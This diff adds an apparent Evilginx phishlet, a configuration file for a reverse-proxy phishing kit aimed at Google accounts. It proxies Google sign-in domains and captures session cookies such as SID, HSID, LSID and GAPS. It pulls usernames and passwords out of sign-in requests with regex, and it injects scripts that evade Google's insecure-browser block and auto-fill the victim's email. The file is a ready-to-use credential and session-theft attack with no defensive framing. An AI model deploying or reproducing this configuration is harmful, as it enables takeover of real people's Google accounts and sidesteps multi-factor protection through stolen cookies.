@@ -1,0 +1,102 @@
+min_ver: '3.0.0'
+author: '@an0nud4y'
+redirect_url: 'https://mail.google.com'
+
+proxy_hosts:
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'ogs', orig_sub: 'ogs', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'content', orig_sub: 'content', domain: 'googleapis.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'googleapis.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'youtube.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'lh3', orig_sub: 'lh3', domain: 'googleusercontent.com', session: false, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '</body>', replace: '<script>!function(){function e(){var t=document.body.textContent||document.body.innerText,n=window.location.href.includes("v3/signin/rejected");t.includes("This browser or app may not be secure.")&&n&&(window.location.href="/")}document.addEventListener("DOMContentLoaded",e),window.addEventListener("load",e),setTimeout(e,2e3)}();</script></body>', mimes: ['text/html']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'www', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'ssl', domain: 'gstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'fonts', domain: 'gstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'content', domain: 'googleapis.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'fonts', domain: 'googleapis.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html']}
+
+auth_tokens:
+  - domain: '.google.com'
+    keys: ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'NID', 'OGPC', 'OGP', '1P_JAR', 'CONSENT', 'SMSV', '.*,regexp']
+  - domain: 'accounts.google.com'
+    keys: ['GAPS', 'LSID', '_utmt', 'utmz', '_utmb', 'ACCOUNT_CHOOSER', '.*,regexp']
+
+auth_urls:
+  - '/v3/signin/_/AccountsSignInUi/data/batchexecute'
+  - '/CheckCookie'
+  - '/ManageAccount'
+
+credentials:
+  username:
+    key: 'f.req'
+    search: '\[\[\["V1UmUe","\[null,\\"(.*?)\\"'
+    type: 'post'
+  password:
+    key: 'f.req'
+    search: '\[1,1,null,\[1,null,null,null,\[\\"(.*?)\\",null,1\]\]'
+    type: 'post'
+
+force_post:
+  - path: 'batchexecute'
+    search:
+      - {key: 'f.req', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+  - path: '/signin'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+landing_path:
+  - '/v3/signin/identifier'
+  - '/signin/v2/identifier'
+
+login:
+  domain: 'accounts.google.com'
+  path: '/v3/signin/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
+
+js_inject:
+  - trigger_domains: ['accounts.google.com']
+    trigger_paths: ['^/v3/signin/.*', '^/signin/v2/.*', '^/$']
+    script: |
+      (function(){
+        var email = '{email}';
+        if (!email) return;
+        function fillAndNext(){
+          var field = document.querySelector('#identifierId') ||
+            document.querySelector('input[name="identifier"]') ||
+            document.querySelector('input[type="email"]');
+          if (field && !field.value) {
+            field.value = email;
+            field.dispatchEvent(new Event('input', {bubbles:true}));
+            field.dispatchEvent(new Event('change', {bubbles:true}));
+          }
+          var next = document.querySelector('#identifierNext') ||
+            document.querySelector('#idSIButton9') ||
+            document.querySelector('button[type="submit"]');
+          if (next && field && field.value) next.click();
+        }
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', fillAndNext);
+        } else {
+          fillAndNext();
+        }
+        setTimeout(fillAndNext, 500);
+        setTimeout(fillAndNext, 1500);
+      })();
